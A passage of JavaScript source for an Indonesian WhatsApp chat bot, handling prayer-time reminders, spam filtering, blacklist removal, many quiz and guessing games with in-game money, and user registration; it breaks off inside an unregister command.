                teks += `- *Isha*: ${jadwalSholat.Isha}\n\n`;

                // Add other time information
                teks += '*Other Time Information:*\n';
                teks += `- *Sunrise*: ${jadwalSholat.Sunrise}\n`;
                teks += `- *Sunset*: ${jadwalSholat.Sunset}\n`;
                teks += `- *Imsak*: ${jadwalSholat.Imsak}\n`;
                teks += `- *Midnight*: ${jadwalSholat.Midnight}\n`;
                teks += `- *Firstthird*: ${jadwalSholat.Firstthird}\n`;
                teks += `- *Lastthird*: ${jadwalSholat.Lastthird}`;

                sock.autosholat[m.chat] = [
                    sock.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
                            mentionedJid: [m.sender],
                            forwardingScore: 999999, 
                            isForwarded: true, 
                            forwardedNewsletterMessageInfo: {
                                newsletterName: saluranName,
                                newsletterJid: saluran,
                            },
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `Blessed Worship, Bro! 🕌`,
                                body: 'Jakarta, Indonesia',
                                previewType: "PHOTO",
                                thumbnailUrl: 'https://8030.us.kg/file/gdaq7s2tqovN.jpg',
                                sourceUrl: wagc
                            }
                        }
                    }),
                    setTimeout(() => {
                        delete sock.autosholat[m.chat];
                    }, 60000) // Remove reminder after 60 seconds
                ];
            }
        }
    }
}
};

if (isCmd) {
if (isFiltered(m.chat) && !isPremium && !isCreator && !m.key.fromMe) return newReply(`Don't spam! please give pause for a few seconds.`);
addFilter(m.chat);
}

if (isCmd) {
if (command) {
    const code = fs.readFileSync("./case.js", "utf8")
    let regex = /case\s+'([^']+)':/g;
    let matches = [];
    let match;
    while ((match = regex.exec(code))) {
        matches.push(match[1]);
    }
    const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
    if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
        let mean = didyoumean(command, help);
        let sim = similarity(command, mean);
        let similarityPercentage = parseInt(sim * 100);
        if (mean && command.toLowerCase() !== mean.toLowerCase()) {
            const pesanTemplate = `*Oops, seems like there's a mistake...* 😅\n_Perhaps you meant:_\n\n➠ *${prefix + mean}* (${similarityPercentage}%)\n\n_Tap *Menu* to see the full list!_ 🌟`;
            m.reply({
                text: pesanTemplate,
                footer: footer,
                buttons: [
                    {
                        buttonId: prefix + mean,
                        buttonText: {
                            displayText: prefix + mean
                        }
                    },
                    {
                        buttonId: `${prefix}menu`,
                        buttonText: {
                            displayText: "📜 Back to Menu"
                        }
                    }
                ],
                viewOnce: true
            });
        }
    }
    if (onlyRegister) {
        if (!(command === "daftar") && !isCreator && !isAdmins) { 
            if (!db.data.users[m.sender].daftar) {
                return newReply(`⚠️ Hi bro! Looks like you haven't registered yet. Register first by typing *.daftar* then complete the registration to access this feature.`);
            }
        }
    }
}
};

if (isBlacklist) {
if (isAdmins || isCreator || !isBotAdmins) return;
let pesan = '*⛔ BLACKLIST DETECTED ⛔*\n\nYour number is detected in the blacklist! Bot does not serve users who have been blacklisted.\n\n🚫 If in a group → You will be removed!\n🚫 If in private chat → You will be blocked!';
if (m.isGroup) {
    sock.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
} else {
    sock.updateBlockStatus(m.sender, 'block');
}

newReply(pesan);
};

const JwbTrue = (tebak, exp, tambahan) => {
let teks = `*🎮 ${tebak} 🎮*\n\nKiw Kiww Correct 🎉\n+Rp ${exp} balance` + tambahan
const context = {
    text: teks,
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 999999, 
        isForwarded: true, 
            forwardedNewsletterMessageInfo: {
            newsletterName: saluranName,
            newsletterJid: saluran,
        },
        externalAdReply: {
            title: `Correct Answer 🥳`,
            body: tebak,
            previewType: "PHOTO",
            thumbnailUrl: `https://telegra.ph/file/f8749fccf9b3320cd6307.png`,
            sourceUrl: wagc
        }
    }
};
return sock.sendMessage(m.chat, context, {
    quoted: m,
});
}

const waktuHabis = (jawaban) => {
let teks = `Peasant, Time's Up🥳\n\n*Answer:*\n${jawaban}`
const context = {
    text: teks,
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 999999, 
        isForwarded: true, 
        forwardedNewsletterMessageInfo: {
            newsletterName: saluranName,
            newsletterJid: saluran,
        },
        externalAdReply: {
            title: `Time's Up ⏰`,
            body: "Such a Peasant",
            previewType: "PHOTO",
            thumbnailUrl: `https://telegra.ph/file/030ebfc99f9cb5be7e8cb.png`,
            sourceUrl: wagc
        }
    }
};
return sock.sendMessage(m.chat, context, {
    quoted: m,
});
}
if (tebakgame[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakgame[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakgame[m.chat][2]
        JwbTrue("Guess Game", tebakgame[m.chat][2], `\n\nSend command .tebakgame\nto play again 🎮`)
        clearTimeout(tebakgame[m.chat][3])
        delete tebakgame[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakhero[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakhero[m.chat][0].key.id) {
    let json = tebakhero[m.chat][1]; // Hero data from API
    let jawaban = json.name.toLowerCase().trim(); // Correct answer

    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakhero[m.chat][2]; // Add money if correct
        JwbTrue("Guess Hero", tebakhero[m.chat][2], `\n\nSend command .tebakhero\nto play again 🎮`);

        clearTimeout(tebakhero[m.chat][3]); // Stop countdown
        delete tebakhero[m.chat]; // Delete game session

        // Add correct answer confirmation message
        sock.sendMessage(m.chat, {
            text: `Correct! That is *${json.name}* 🎯`
        }, { quoted: m });
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold) {
        newReply(`_Yes, Almost There!_`); // Give hint if almost correct
    } else {
        m.react('❌'); // Give reaction if wrong
    }
}
}

if (tebakff[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakff[m.chat][0].key.id) {
    // Get correct answer from API result
    let json = tebakff[m.chat][1];
    let jawaban = json.name.toLowerCase().trim(); // Correct answer

    // Check if user's answer matches correct answer
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakff[m.chat][2]; // Add money if correct
        JwbTrue("Guess Free Fire", tebakff[m.chat][2], `\n\nSend command .tebakff\nto play again 🎮`);

        clearTimeout(tebakff[m.chat][3]); // Stop countdown
        delete tebakff[m.chat]; // Delete game session

        // Add image or message for correct answer
        sock.sendMessage(m.chat, {
            image: { url: json.gambar },
            caption: `Correct! That is *${json.name}* 🎯`
        }, { quoted: m });
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold) {
        // Give hint if answer is close
        newReply(`_Yes, Almost There!_`);
    } else {
        // Give response if wrong
        m.react('❌');
    }
}
}

if (tebakkabupaten[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakkabupaten[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakkabupaten[m.chat][1]))
    jawaban = json.title.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakkabupaten[m.chat][2]
        JwbTrue("Guess District", tebakkabupaten[m.chat][2], `\n\nSend command .tebakkabupaten\nto play again 🎮`)
        clearTimeout(tebakkabupaten[m.chat][3])
        delete tebakkabupaten[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakjkt48[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakjkt48[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakjkt48[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakjkt48[m.chat][2]
        JwbTrue("Guess JKT48", tebakjkt48[m.chat][2], `\n\nSend command .tebakjkt48\nto play again 🎮`)
        clearTimeout(tebakjkt48[m.chat][3])
        delete tebakjkt48[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakhewan[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakhewan[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakhewan[m.chat][1]))
    jawaban = json.title.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakhewan[m.chat][2]
        JwbTrue("Guess Animal", tebakhewan[m.chat][2], `\n\nSend command .tebakhewan\nto play again 🎮`)
        clearTimeout(tebakhewan[m.chat][3])
        delete tebakhewan[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakml[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakml[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakml[m.chat][1]))
    jawaban = json.title.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakml[m.chat][2]
        JwbTrue("Guess ML Sound", tebakml[m.chat][2], `\n\nSend command .tebakml\nto play again 🎮`)
        clearTimeout(tebakml[m.chat][3])
        delete tebakml[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakchara[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakchara[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakchara[m.chat][1]))
    jawaban = json.name.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakchara[m.chat][2]
        JwbTrue("Guess Anime", tebakchara[m.chat][2], `\n\nSend command .tebakchara\nto play again 🎮`)
        clearTimeout(tebakchara[m.chat][3])
        delete tebakchara[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebaklogo[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebaklogo[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebaklogo[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebaklogo[m.chat][2]
        JwbTrue("Guess Logo", tebaklogo[m.chat][2], `\n\nSend command .tebaklogo\nto play again 🎮`)
        clearTimeout(tebaklogo[m.chat][3])
        delete tebaklogo[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakaplikasi[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakaplikasi[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakaplikasi[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakaplikasi[m.chat][2]
        JwbTrue("Guess Application", tebakaplikasi[m.chat][2], `\n\nSend command .tebakaplikasi\nto play again 🎮`)
        clearTimeout(tebakaplikasi[m.chat][3])
        delete tebakaplikasi[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakgambar[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakgambar[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakgambar[m.chat][2]
        JwbTrue("Guess Picture", tebakgambar[m.chat][2], `\n\nSend command .tebakgambar\nto play again 🎮`)
        clearTimeout(tebakgambar[m.chat][3])
        delete tebakgambar[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakkata[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakkata[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakkata[m.chat][2]
        JwbTrue("Guess Word", tebakkata[m.chat][2], `\n\nSend command .tebakkata\nto play again 🎮`)
        clearTimeout(tebakkata[m.chat][3])
        delete tebakkata[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (asahotak[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == asahotak[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(asahotak[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += asahotak[m.chat][2]
        JwbTrue("Brain Teaser", asahotak[m.chat][2], `\n\nSend command .asahotak\nto play again 🎮`)
        clearTimeout(asahotak[m.chat][3])
        delete asahotak[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (lengkapikalimat[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == lengkapikalimat[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(lengkapikalimat[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += lengkapikalimat[m.chat][2]
        JwbTrue("Complete Sentence", lengkapikalimat[m.chat][2], `\n\nSend command .lengkapikalimat\nto play again 🎮`)
        clearTimeout(lengkapikalimat[m.chat][3])
        delete lengkapikalimat[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakbendera[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakbendera[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
    jawaban = json.name.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakbendera[m.chat][2]
        JwbTrue("Guess Flag", tebakbendera[m.chat][2], `\n\nSend command .tebakbendera\nto play again 🎮`)
        clearTimeout(tebakbendera[m.chat][3])
        delete tebakbendera[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (caklontong[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == caklontong[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += caklontong[m.chat][2]
        JwbTrue("Cak Lontong", caklontong[m.chat][2], `\n\nSend command .caklontong\nto play again 🎮`)
        clearTimeout(caklontong[m.chat][3])
        delete caklontong[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (susunkata[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == susunkata[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += susunkata[m.chat][2]
        JwbTrue("Arrange Words", susunkata[m.chat][2], `\n\nSend command .susunkata\nto play again 🎮`)
        clearTimeout(susunkata[m.chat][3])
        delete susunkata[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakkalimat[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakkalimat[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakkalimat[m.chat][2]
        JwbTrue("Guess Sentence", tebakkalimat[m.chat][2], `\n\nSend command .tebakkalimat\nto play again 🎮`)
        clearTimeout(tebakkalimat[m.chat][3])
        delete tebakkalimat[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (siapaaku[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == siapaaku[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += siapaaku[m.chat][2]
        JwbTrue("Guess Who", siapaaku[m.chat][2], `\n\nSend command .tebaksiapa\nto play again 🎮`)
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
    newReply(`_Yes, Almost There!_`)
else m.react('❌');
}
}

if (tekateki[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tekateki[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tekateki[m.chat][2]
        JwbTrue("Riddle", tekateki[m.chat][2], `\n\nSend command .tekateki\nto play again 🎮`)
        clearTimeout(tekateki[m.chat][3])
        delete tekateki[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebakkimia[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebakkimia[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
    jawaban = json.unsur.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebakkimia[m.chat][2]
        JwbTrue("Chemistry Quiz", tebakkimia[m.chat][2], `\n\nSend command .tebakkimia\nto play again 🎮`)
        clearTimeout(tebakkimia[m.chat][3])
        delete tebakkimia[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebaklirik[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebaklirik[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebaklirik[m.chat][2]
        JwbTrue("Lyrics Quiz", tebaklirik[m.chat][2], `\n\nSend command .tebaklirik\nto play again 🎮`)
        clearTimeout(tebaklirik[m.chat][3])
        delete tebaklirik[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

if (tebaktebakan[m.chat] && !isCmd && m.quoted) {
if (m.quoted.id == tebaktebakan[m.chat][0].key.id) {
    let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
    jawaban = json.jawaban.toLowerCase().trim()
    if (budy.toLowerCase() == jawaban) {
        db.data.users[m.sender].uang += tebaktebakan[m.chat][2]
        JwbTrue("Riddle Game", tebaktebakan[m.chat][2], `\n\nSend command .tebaktebakan\nto play again 🎮`)
        clearTimeout(tebaktebakan[m.chat][3])
        delete tebaktebakan[m.chat]
    } else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
        newReply(`_Yes, Almost There!_`)
    else m.react('❌');
}
}

async function cekgame(gamejid) {
if (tekateki[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tekateki[gamejid][0]
    })
    return true
} else if (caklontong[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: caklontong[gamejid][0]
    })
    return true
} else if (susunkata[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: susunkata[gamejid][0]
    })
    return true
} else if (mathgame[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "Mathgame hasn't been completed"
    }, {
        quoted: mathgame[gamejid][0]
    })
    return true
} else if (tebaktebakan[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebaktebakan[gamejid][0]
    })
    return true
} else if (tebaklirik[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebaklirik[gamejid][0]
    })
    return true
} else if (tebakkimia[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakkimia[gamejid][0]
    })
    return true
} else if (siapaaku[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: siapaaku[gamejid][0]
    })
    return true
} else if (tebakkalimat[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakkalimat[gamejid][0]
    })
    return true
} else if (tebakbendera[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakbendera[gamejid][0]
    })
    return true
} else if (tebakkata[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakkata[gamejid][0]
    })
    return true
} else if (asahotak[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: asahotak[gamejid][0]
    })
    return true
} else if (lengkapikalimat[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: lengkapikalimat[gamejid][0]
    })
    return true
} else if (tebakgame[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakgame[gamejid][0]
    })
    return true
} else if (tebakhero[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakhero[gamejid][0]
    })
    return true
} else if (tebakff[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakff[gamejid][0]
    })
    return true
} else if (tebakkabupaten[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakkabupaten[gamejid][0]
    })
    return true
} else if (tebakjkt48[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakjkt48[gamejid][0]
    })
    return true
} else if (tebakhewan[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakhewan[gamejid][0]
    })
    return true
} else if (tebakml[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakml[gamejid][0]
    })
    return true
} else if (tebakchara[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakchara[gamejid][0]
    })
    return true
} else if (tebaklogo[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebaklogo[gamejid][0]
    })
    return true
} else if (tebakaplikasi[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakaplikasi[gamejid][0]
    })
    return true
} else if (tebakgambar[gamejid]) {
    sock.sendMessage(gamejid, {
        text: "This question hasn't been completed, finish it first before continuing~"
    }, {
        quoted: tebakgambar[gamejid][0]
    })
    return true
} else {
    return false
}
}

const handleLimit = (type, usernya, limitnya) => {
let jid = `${usernya}@s.whatsapp.net`;

if (type === 'add') {
    db.data.users[jid].limit += Number(limitnya);
    return newReply(`✅ User limit successfully added! 🎯`);
} 
if (type === 'del') {
    if (db.data.users[jid].limit < limitnya) return newReply(`⚠️ Insufficient limit.`);
    db.data.users[jid].limit -= Number(limitnya);
    return newReply(`✅ User limit successfully reduced! ✂️`);
}
if (type === 'reset') {
    const limitUser = db.data.users[jid].vip 
        ? global.limit.vip 
        : checkPremiumUser(jid, premium) 
            ? global.limit.premium 
            : global.limit.free;

    db.data.users[jid].limit = limitUser;
    return newReply(`✅ User limit successfully reset! ✂️`);
}
};

const handleMoney = (type, usernya, uangnya) => {
let jid = `${usernya}@s.whatsapp.net`;

if (type === 'add') {
    db.data.users[jid].uang += Number(uangnya);
    return newReply(`✅ User money successfully added! 🎯`);
} 
if (type === 'del') {
    if (db.data.users[jid].uang < uangnya) return newReply(`⚠️ Insufficient money.`);
    db.data.users[jid].uang -= Number(uangnya);
    return newReply(`✅ User money successfully reduced! ✂️`);
}
if (type === 'reset') {
    const uangUser = db.data.users[jid].vip 
        ? global.uang.vip 
        : checkPremiumUser(jid, premium) 
            ? global.uang.premium 
            : global.uang.free;

    db.data.users[jid].uang = uangUser;
    return newReply(`✅ User money successfully reset! ✂️`);
}
};


async function sendAdventureMessage(chat, judul, deskripsi, thumb) {
await sock.sendMessage(chat, {
    text: `-「 *ADVENTURE* 」-\n\n*${judul}*\n${deskripsi}\n\n📌 *Example:* _.adventure savannah_`,
    contextInfo: {
        externalAdReply: {
            title: "RPG - ADVENTURE",
            body: 'Start your adventure now!',
            thumbnailUrl: thumb,
            sourceUrl: wagc,
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: m });
};

async function prosesAdventure(chat, lokasi, hasil, thumb) {
let { key } = await sock.sendMessage(chat, { text: '🧭 Adventuring, Please Wait...' }, { quoted: m });
await sleep(3000);
await sock.sendMessage(chat, { text: `⚔️ You encountered *${hasil.musuh}*`, edit: key });
await sleep(5000);
await sock.sendMessage(chat, { text: `🔎 Exploring...`, edit: key });
await sleep(3000);

let hasilText = `-「 *ADVENTURE* 」-\n\n📍 *${lokasi}*\n\n🪵 Wood: ${hasil.kayu}\n⛓️ Iron: ${hasil.besi}\n🏆 Rank: ${hasil.rank}\n💰 Money: Rp ${hasil.saldo}\n\n⚡ *Stamina reduced -20*`;
await sendAdventureMessage(chat, hasilText, "", thumb);
};

switch (command) {
case 'daftar': {
    if (db.data.users[m.sender].daftar) return newReply('You\'re already registered! I\'m happy to help you. 😜');
    let [nama, umur, askot] = text.split(",");
    if (!nama || !umur || !askot) {
        let pesan = `Hi bro, let me tell you how to register:\n\n`;
        pesan += `Type:\n${prefix + command} name,age,city\n\n`;
        pesan += `Example:\n${prefix + command} Me,16,Jakarta`;
        return newReply(pesan);
    }
    if (isNaN(umur)) return newReply('The age you entered is not valid. Please check again! 🤔');
    if (umur < 10) return newReply('Hihi, sorry bro, I can only help you if you\'re over 10 years old. Wait until you\'re older! 😄');
    if (umur > 50) return newReply('Wow bro, I think at that age you should just rest. Take care of your health! 🥰');
    try {
        db.data.users[m.sender].nama = nama;
        db.data.users[m.sender].umur = Number(umur);
        db.data.users[m.sender].askot = askot;
        db.data.users[m.sender].daftar = true;
        db.data.users[m.sender].uang = (db.data.users[m.sender].uang || 0) + 5000;
        db.data.users[m.sender].limit = (db.data.users[m.sender].limit || 0) + 20;
        if (verifyNumber[m.sender]) {
            clearTimeout(verifyNumber[m.sender][4]);
            delete verifyNumber[m.sender];
        }
        let pesan = `Yay, you successfully registered! 🎉\n\n`;
        pesan += `📦 *User Info*:\n`;
        pesan += `- *Name*: ${nama}\n`;
        pesan += `- *Origin*: ${askot}\n`;
        pesan += `- *Number*: ${m.sender.split("@")[0]}\n`;
        pesan += `- *Age*: ${umur}\n\n`;
        pesan += `🎁 *Registration Bonus:*\n`;
        pesan += `- Rp. 5000 money\n`;
        pesan += `- 20 Additional limit\n\n`;
        pesan += `Thank you for registering bro! I hope I can continue helping you. 🥰`;
        newReply(pesan);
        if (notifRegister) {
            try {
                let avatar;
                try {
                    avatar = await sock.profilePictureUrl(m.sender, "image");
                } catch {
                    avatar = imageUrl;
                }
                let notif = `There\'s a new user who registered! 🎉\n\n`;
                notif += `- *Name*: ${nama}\n`;
                notif += `- *Age*: ${umur}\n`;
                notif += `- *Tag*: @${m.sender.split("@")[0]}\n\n`;
                notif += `Welcome to my system! 🥳`;
                sock.sendMessage(ownerNumber + '@s.whatsapp.net', {
                    text: notif,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 9999999,
                        isForwarded: true,
                        externalAdReply: {
                            showAdAttribution: true,
                            containsAutoReply: true,
                            title: `Registration Notification`,
                            body: `Time: ${date} ${time}`,
                            previewType: "PHOTO",
                            thumbnailUrl: avatar,
                            sourceUrl: wagc
                        }
                    }
                });
            } catch (error) {
                console.log('Failed to send registration notification:', error);
            }
        }
    } catch (error) {
        console.log('Error during registration:', error);
        newReply('Oops bro, there\'s an error here. Let me try to fix it first! 🙏');
    }
}
break;

case 'unregister': 
case 'unreg': 
case 'hapusakun': {
    let replyText = '';
    if (!args[0]) {
        replyText += 'You need to enter the phone number to delete! 😊\n\n';
        replyText += '*Example:*\n';
        replyText += `${prefix + command} 6281234567890`;
        return newReply(replyText);
    }
